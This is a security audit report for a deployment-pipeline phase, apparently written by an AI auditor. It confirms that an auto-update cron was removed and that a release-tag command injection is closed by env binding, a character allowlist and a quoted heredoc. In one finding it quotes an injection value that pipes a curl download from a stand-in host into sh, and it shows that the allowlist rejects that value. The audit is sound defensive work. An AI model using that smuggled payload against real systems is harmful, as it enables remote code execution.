---
phase: 03-update-path-reconciliation
audited: 2026-07-02
asvs_level: 1
auditor: Claude (gsd-security-auditor)
block_on: high
threats_total: 7
threats_closed: 7
threats_open: 0
status: SECURED
---

# Phase 03 — Security Audit Report

**Phase:** 03 — Update Path Reconciliation
**Threats Closed:** 7/7
**ASVS Level:** 1
**Block on:** high

---

## Threat Verification

| Threat ID | Category | Disposition | Status | Evidence |
|-----------|----------|-------------|--------|----------|
| T-03-01 | Elevation of Privilege | mitigate | CLOSED | See below |
| T-03-02 | Tampering | mitigate | CLOSED | See below |
| T-03-03 | Tampering | mitigate | CLOSED | See below |
| T-03-04 | Tampering (CRITICAL) | mitigate | CLOSED | See below |
| T-03-05 | Tampering | mitigate | CLOSED | See below |
| T-03-06 | Tampering / Elevation | mitigate | CLOSED | See below |
| T-03-07 | Information Disclosure | mitigate | CLOSED | See below |

---

## Detailed Findings

### T-03-01 — CLOSED

**Threat:** Hourly/daily cron on VM auto-deploying ungated `main` HEAD.

**Declared mitigation:** `getvul-update` string hard-removed from `install.sh` and all three cloud `startup.sh` scripts.

**Verification:**
- `grep -c "getvul-update" install.sh` → 0 (install.sh:94-96 replaced with removal comment referencing docs/17-troubleshooting.md §B1)
- `grep -c "getvul-update" infra/gcp/startup.sh` → 0 (lines 73-75: removal comment only)
- `grep -c "getvul-update" infra/aws/startup.sh` → 0 (lines 97-98: removal comment only)
- `grep -c "getvul-update" infra/azure/startup.sh` → 0 (lines 75-76: removal comment only)

No cron-install code exists at any provisioning entry point. The race is structurally impossible on freshly provisioned VMs.

---

### T-03-02 — CLOSED

**Threat:** Residual cron on already-provisioned VM keeps auto-deploying after code change ships.

**Declared mitigation:** One-time operator cleanup documented in `docs/17-troubleshooting.md` §B1.

**Verification:**
- `grep -c "sudo rm -f /etc/cron.d/getvul-update" docs/17-troubleshooting.md` → 1 (docs/17-troubleshooting.md:112)
- §B1 heading: "A migrated VM still has the old auto-update cron installed" (lines 104-116)
- Cleanup commands present: `sudo rm -f /etc/cron.d/getvul-update /usr/local/bin/getvul-update` and `crontab -l 2>/dev/null | grep -v getvul-update | crontab -`

**Note:** Live-VM execution of the cleanup is a manual operator step (not automated). The documentation gate is satisfied; actual cleanup on pre-existing VMs remains an operator responsibility and should be captured in the phase VERIFICATION.md.

---

### T-03-03 — CLOSED

**Threat:** `scripts/auto-update.sh` hardcodes `Cyber-Solutions-MD/getvul`; wrong-repo deploy if repo transferred.

**Declared mitigation:** File `git rm`'d from tree.

**Verification:**
- `git ls-files scripts/auto-update.sh` → empty (committed deletion in commit 7128409 per 03-01-SUMMARY.md)
- No code path can reference or invoke the file.

---

### T-03-04 — CLOSED (originally under-rated; independently verified as patched)

**Threat:** `release_tag` `workflow_dispatch` input injected into `git checkout` inside SSH heredoc — RCE on runner and production VM.

**Original plan disposition** was under-rated (called residual risk LOW, deferred allowlist as "optional"). Code review CR-01 correctly identified this as a CRITICAL regression: switching from a quoted to an unquoted heredoc with `${{ env.DEPLOY_TAG }}` interpolation directly in the `run:` body opened a full command-injection path.

**Declared mitigation (post-CR-01 patch, commit 37c3a37):** Four controls verified independently:

**(a) Env-var binding — inputs never interpolated into `run:` script text:**
- `.github/workflows/cd.yml:25-29`: the "Resolve deploy tag" step uses an `env:` block to bind both expressions to shell variables (`RELEASE_TAG_NAME`, `DISPATCH_TAG`) before any script runs.
- `inputs.release_tag` appears only at line 29 inside the `env:` block, never inside a `run:` script string. Confirmed: no occurrence of `${{ inputs.release_tag }}` in any `run:` body.

**(b) Allowlist validation — `^[A-Za-z0-9][A-Za-z0-9._-]*$`:**
- `.github/workflows/cd.yml:42`: `printf '%s' "$DEPLOY_TAG" | grep -Eq '^[A-Za-z0-9][A-Za-z0-9._-]*$'`
- Pattern requires alphanumeric start; forbids `/`, `;`, `"`, `` ` ``, `$`, space, and all other shell metacharacters. A value like `v1.0.0"; curl evil.sh | sh; echo "` is rejected before GITHUB_ENV is written. A branch name such as `main` or `refs/tags/../heads/main` is rejected by the `/` prohibition.

**(c) Quoted heredoc `<< 'DEPLOY'`:**
- `.github/workflows/cd.yml:62`: `ssh ... bash -s << 'DEPLOY'`
- The quoted delimiter means the runner shell does NOT expand `$(...)`, backticks, or `$VARS` in the heredoc body. `DEPLOY_TAG` is passed as a remote environment variable (`DEPLOY_TAG="$DEPLOY_TAG" bash -s`) and consumed as `$DEPLOY_TAG` in the VM-side shell — no expression interpolation occurs on the runner side.

**(d) DEPLOY_TAG passed to VM as remote env var:**
- `.github/workflows/cd.yml:62`: `DEPLOY_TAG="$DEPLOY_TAG" bash -s`
- At this point `DEPLOY_TAG` has already passed the allowlist check. It is expanded once by the runner shell (safe: the value is in `$GITHUB_ENV` as a plain string) and forwarded as an environment variable to the remote bash session. The remote shell reads `$DEPLOY_TAG` as a variable, not as re-evaluated script text.

**Additional WR-01 fix verified:** `.github/workflows/cd.yml:73-77`: before checkout, a `git rev-parse -q --verify "refs/tags/$DEPLOY_TAG^{commit}"` preflight guard is present. If `DEPLOY_TAG` is a branch name that slips through (impossible given the allowlist forbids `/`, but defense-in-depth), the `refs/tags/` namespace prefix forces a tag-only match; a branch name that passes the allowlist (no `/`) still would not resolve as `refs/tags/branchname^{commit}` and the guard exits 1 before checkout. The checkout itself uses `refs/tags/$DEPLOY_TAG` explicitly (line 77), not the bare name.

**Injection path assessment:** CLOSED. The four controls together — env binding, allowlist, quoted heredoc, remote env var — eliminate the injection path identified in CR-01. The DEPLOY_TAG value at the point it enters shell context has been validated against a narrow character class and is never re-evaluated as script text.

---

### T-03-05 — CLOSED

**Threat:** Stale/moved local tag on VM causes checkout of wrong commit.

**Declared mitigation:** `git fetch --tags --force` before checkout.

**Verification:**
- `grep -c "git fetch --tags --force" .github/workflows/cd.yml` → 1 (line 69)
- `git fetch --tags --force` precedes the `rev-parse` preflight and the `git checkout --force` on line 77. The `--force` flag on fetch updates any locally-cached tag that has been moved on the remote, ensuring the VM always resolves the tag to the remote's current commit.

---

### T-03-06 — CLOSED

**Threat:** `github.ref_name` silently deploying `main` HEAD on manual dispatch.

**Declared mitigation:** Uses `github.event.release.tag_name || inputs.release_tag`; `github.ref_name` forbidden.

**Verification:**
- `grep -c "github.ref_name" .github/workflows/cd.yml` → 0 (anti-pattern absent from entire file)
- `grep -c "github.event.release.tag_name" .github/workflows/cd.yml` → 2 (line 28 env binding, line 31 shell assignment)
- Tag resolution uses `RELEASE_TAG_NAME:-$DISPATCH_TAG` (line 31) — on `release:published`, `RELEASE_TAG_NAME` is the published tag name; on `workflow_dispatch`, `DISPATCH_TAG` is the operator-supplied `release_tag` input.
- WR-01 fix also confirmed: the `refs/tags/` namespace prefix on both `rev-parse` (line 73) and `checkout` (line 77) means even an allowlist-passing value must exist as a tag (not a branch) to proceed.

---

### T-03-07 — CLOSED

**Threat:** Operator assumes code rollback reverts DB; data loss on destructive migration.

**Declared mitigation:** Prominent WARNING blockquote placed BEFORE the trigger step in `docs/13-deployment.md` rollback runbook.

**Verification:**
- `grep -c "DOES NOT REVERT DATABASE MIGRATIONS" docs/13-deployment.md` → 1 (line 741)
- Placement confirmed: WARNING blockquote is in "Step 2 — Check whether the bad release ran a destructive migration" (docs/13-deployment.md:739-752), which precedes "Step 3 — Trigger the CD workflow" (line 754). The operator must read the caveat before reaching the trigger command.
- `gh workflow run cd.yml --field release_tag=<prior-tag>` is present at line 757.

---

## Unregistered Threat Flags

**From SUMMARY.md `## Threat Flags`:**

- 03-01-SUMMARY.md: "No new network endpoints, auth paths, file access patterns, or schema changes introduced. This plan removes a security threat surface (T-03-01)."
- 03-02-SUMMARY.md: No `## Threat Flags` section; no new threat surface declared.

No unregistered flags requiring mapping.

---

## Residual Risks (Not Blockers — Outside Formal Threat Register)

These are open code-review warnings from 03-REVIEW.md (WR-02, WR-03, WR-04). They do not map to any threat in the register and are documented here for operator awareness. They do not block shipment at ASVS Level 1 / `block_on: high`.

### RR-01 (from WR-02): `set -e` propagation through SSH heredoc is fragile

`.github/workflows/cd.yml:62-100`. The remote script runs `set -e`, but `ssh`'s exit-code propagation through a heredoc on stdin is not guaranteed to fail the CD job on every intermediate failure (e.g. `docker compose build` failing mid-stream). A failed build could advance to the health loop rather than failing fast. The trailing `curl ... || exit 1` catch is the only definitive gate.

**Suggested hardening:** Run remote body via `ssh ... 'bash -s'` with `set -euo pipefail`, or add explicit exit-status checks after `docker compose build` and `docker compose up -d`.

### RR-02 (from WR-03): Health-check loop does not track whether it ever succeeded

`.github/workflows/cd.yml:84-91`. The `for i in $(seq 1 30)` loop breaks on first success but does not set a success flag. If all 30 probes fail, the loop exits silently and the single `curl ... || exit 1` at line 94 is the only safety net. A flapping app could pass the final probe despite never stabilizing.

**Suggested hardening:** Track `ok=0`/`ok=1` inside the loop; `[ "$ok" = 1 ] || exit 1` after the loop.

### RR-03 (from WR-04): Host-key verification is decorative

`.github/workflows/cd.yml:55`: `ssh-keyscan ... || true` followed by `-o StrictHostKeyChecking=no` on line 62. `ssh-keyscan` errors are swallowed and host-key checking is disabled anyway, so a machine-in-the-middle on the VM's IP would not be detected.

**Suggested hardening:** Store the known host key in a GitHub secret, write it to `known_hosts`, and use `StrictHostKeyChecking=yes`. At minimum remove `|| true` so keyscan failures surface in the log.

---

## Manual UAT Gate (Not Automated)

SC#4 from 03-02-PLAN.md is a human-only item: dry-run rollback on a test VM (cut throwaway release → deploy via CD → trigger `cd.yml` workflow_dispatch with `release_tag=<prior-tag>` → confirm `/health` 200). Requires real GCE infra and credentials. Must be recorded in `.planning/phases/03-update-path-reconciliation/03-VERIFICATION.md` before the phase is considered fully verified end-to-end.

---

## Accepted Risks Log

None. All registered threats are mitigated. No threats carry `accept` or `transfer` dispositions.
